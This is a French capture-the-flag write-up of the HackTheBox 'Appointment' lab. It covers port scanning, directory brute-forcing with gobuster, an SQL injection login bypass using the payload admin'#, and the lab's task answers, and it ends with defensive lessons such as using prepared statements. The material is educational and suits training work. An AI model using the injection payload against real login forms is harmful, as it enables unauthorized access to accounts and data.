# 🧠 HackTheBox — Appointment

<div align="center">

![HackTheBox](https://img.shields.io/badge/HackTheBox-Appointment-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20SQLi-orange?style=for-the-badge)
![Rating](https://img.shields.io/badge/Rating-4.6%2F5-yellow?style=for-the-badge)

</div>

---

## 📋 Machine Info

| Field        | Details                        |
|--------------|-------------------------------|
| **Name**     | Appointment                   |
| **OS**       | Linux                         |
| **Difficulty** | ⭐ Very Easy                 |
| **Rating**   | 4.6 / 5 (465 votes)           |
| **XP**       | 150 XP                        |
| **Category** | Web Application / SQL Injection |

---

## 📖 Summary

**Appointment** est une machine HackTheBox de niveau Very Easy axée sur les bases de la sécurité web.  
L'objectif est de compromettre une application web vulnérable à une **injection SQL** (SQLi) afin de contourner l'authentification et récupérer le flag.

> **Concepts clés :** Enumération, SQL Injection, Bypass d'authentification, OWASP A03:2021

---

## 🛠️ Outils Utilisés

- `nmap` — Énumération des ports et services
- `gobuster` — Brute-force de répertoires web
- Navigateur web / Burp Suite — Exploitation SQLi

---

## 🔍 Étape 1 — Scan Nmap

On commence par un scan de port pour identifier les services exposés sur la cible.

```bash
nmap -sV -sC -p- 10.129.x.x
```

**Résultats :**

| Port | État  | Service | Version                   |
|------|-------|---------|---------------------------|
| 80   | open  | http    | Apache httpd 2.4.38 (Debian) |

![Scan Nmap](./nmap_scan_1784382889186.png)

> 💡 Seul le port **80 (HTTP)** est ouvert, hébergeant un serveur **Apache 2.4.38** sous Debian.

---

## 🌐 Étape 2 — Découverte de la Page de Login

En naviguant sur `http://10.129.x.x/`, on découvre une page de connexion simple.

```bash
gobuster dir -u http://10.129.x.x/ -w /usr/share/wordlists/dirb/common.txt
```

![Page de Login](./login_page_1784383027136.png)

> 🎯 La page de login est la cible principale. On remarque un formulaire avec les champs `username` et `password`.

---

## 💉 Étape 3 — Exploitation SQL Injection (SQLi)

Le formulaire est vulnérable à une **injection SQL classique**.  
En utilisant le caractère `#` (commentaire MySQL), on peut court-circuiter la requête SQL côté serveur.

### Payload utilisé

```
Username: admin'#
Password: (n'importe quoi)
```

### Logique de l'injection

La requête SQL originale ressemble à :

```sql
SELECT * FROM users WHERE username='admin' AND password='monpassword';
```

Avec le payload, elle devient :

```sql
SELECT * FROM users WHERE username='admin'# AND password='...';
-- La partie après # est commentée → bypass total !
```

![SQL Injection](./sqli_payload_1784383323458.png)

> ⚠️ **OWASP A03:2021 — Injection** : Cette vulnérabilité est l'une des plus critiques selon l'OWASP Top 10.

---

## 🏁 Étape 4 — Récupération du Flag

Après avoir soumis le payload SQLi, la page affiche **"Congratulations"** et révèle le flag !

![Flag](./flag_page_1784383419373.png)

```
HTB{************}
```

> 🎉 Machine compromise avec succès ! Vous êtes le joueur **#248278** à avoir résolu **Appointment**.

---

## 📚 Réponses aux Tasks

| Task | Question | Réponse |
|------|----------|---------|
| 1 | Acronyme SQL | `Structured Query Language` |
| 2 | Type de vulnérabilité commun | `SQL injection` |
| 4 | Classification OWASP 2021 | `A03:2021-Injection` |
| 5 | Service sur le port 80 | `Apache httpd 2.4.38 ((Debian))` |
| 6 | Port standard HTTPS | `443` |
| 7 | Dossier en terminologie web | `directory` |
| 8 | Code HTTP "Not Found" | `404` |
| 9 | Switch Gobuster pour les dossiers | `dir` |
| 10 | Caractère de commentaire MySQL | `#` |
| 11 | Premier mot de la page après bypass | `Congratulations` |

---

## 🔐 Leçons Apprises

1. **Toujours scanner les ports** avec nmap pour identifier les services exposés.
2. **Les injections SQL** restent l'une des vulnérabilités les plus répandues.
3. **Le caractère `#`** en MySQL permet de commenter le reste d'une requête SQL.
4. **Ne jamais faire confiance aux entrées utilisateur** sans validation côté serveur.
5. Utiliser des **requêtes préparées (prepared statements)** pour prévenir les SQLi.

---

## 📎 Ressources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [HackTheBox Appointment](https://app.hackthebox.com/starting-point)
- [Nmap Documentation](https://nmap.org/docs.html)
- [MySQL Comment Syntax](https://dev.mysql.com/doc/refman/8.0/en/comments.html)

---

<div align="center">

**Made with ❤️ by H4concef | HackTheBox Starting Point**

</div>
